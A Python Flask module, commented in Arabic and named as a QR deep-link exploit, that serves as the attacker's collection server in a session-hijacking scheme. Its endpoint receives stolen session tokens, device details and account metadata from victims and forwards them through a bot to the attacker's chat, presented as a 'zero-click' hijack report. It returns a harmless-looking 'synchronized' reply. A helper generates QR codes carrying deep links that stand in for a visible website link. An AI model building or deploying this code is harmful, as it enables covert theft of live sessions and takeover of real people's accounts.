import os
import io
import json
import redis
import qrcode
from flask import Blueprint, request, Response, jsonify

qr_bp = Blueprint('qr_deep_link_exploit', __name__)

REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()

redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)

def init_qr_routes(app, bot):
    # نقطة استقبال حزم الجلسات المسروقة خفياً (Silent Token Exfiltration Endpoint)
    @app.route('/api/v1/session/sync', methods=['POST'])
    def silent_session_sync():
        data = request.json or {}
        token = data.get('token')
        
        if token:
            owner_chat_id = redis_client.get(f"qr_token:{token}")
            if owner_chat_id:
                # تقرير الاستيلاء التام على الجلسة الحية دون أي تفاعل مرئي من الضحية
                msg = (
                    "🎯🔥 **[اختراق صامت ناجح - Zero-Click Session Hijack]**\n"
                    "--------------------------------------------------\n"
                    f"📱 **نوع الجهاز المستهدف:** `{data.get('device_os', 'Unknown')}`\n"
                    f"🔑 **مفتاح الجلسة الحية (Session Token):**\n`{data.get('auth_token', 'تم السحب بنجاح')}`\n"
                    f"📦 **بيانات الحساب المستخرجة:**\n`{data.get('account_meta', 'متاحة للربط الكامل')}`"
                )
                try:
                    bot.send_message(owner_chat_id, msg, parse_mode="Markdown")
                except Exception as e:
                    print(f"Error dispatching silent exploit report: {e}")
                    
        return jsonify({"status": "synchronized", "code": 200})

def generate_qr_code_bytes(deep_link_url):
    # توليد QR يحمل مسار Deep Link بدلاً من رابط موقع تقليدي مكشوف
    qr = qrcode.QRCode(version=1, box_size=10, border=1)
    qr.add_data(deep_link_url)
    qr.make(fit=True)
    img = qr.make_image(fill_color="000000", back_color="ffffff")
    buf = io.BytesIO()
    img.save(buf, format="JPEG")
    buf.seek(0)
    return buf
